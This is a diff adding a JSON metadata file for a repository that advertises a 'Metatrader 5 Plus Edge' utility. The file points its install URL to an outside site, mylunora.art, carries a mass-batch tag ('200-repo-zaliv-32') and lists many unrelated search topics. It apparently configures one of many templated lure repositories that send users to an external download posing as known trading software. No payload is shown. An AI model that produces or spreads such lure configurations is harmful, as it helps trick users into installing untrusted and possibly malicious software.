@@ -1,0 +1,26 @@
+{
+  "repo": "metatrader-5-plus-edge",
+  "product": "Metatrader 5 Plus Edge",
+  "kind": "utility",
+  "install_type": "mylunora",
+  "install_url": "https://mylunora.art",
+  "batch": "200-repo-zaliv-32",
+  "format": "license-md-mylunora-v3-game-copy",
+  "category": "system-tools",
+  "topics": [
+    "metatrader-5-plus-edge",
+    "metatrader-desktop",
+    "metatrader-windows",
+    "system-optimization",
+    "driver-update",
+    "pc-maintenance",
+    "disk-cleanup",
+    "registry-tools",
+    "desktop-utility",
+    "windows-tools",
+    "performance-tuning",
+    "hardware-monitor",
+    "admin-toolkit"
+  ],
+  "site": "mylunora.art"
+}
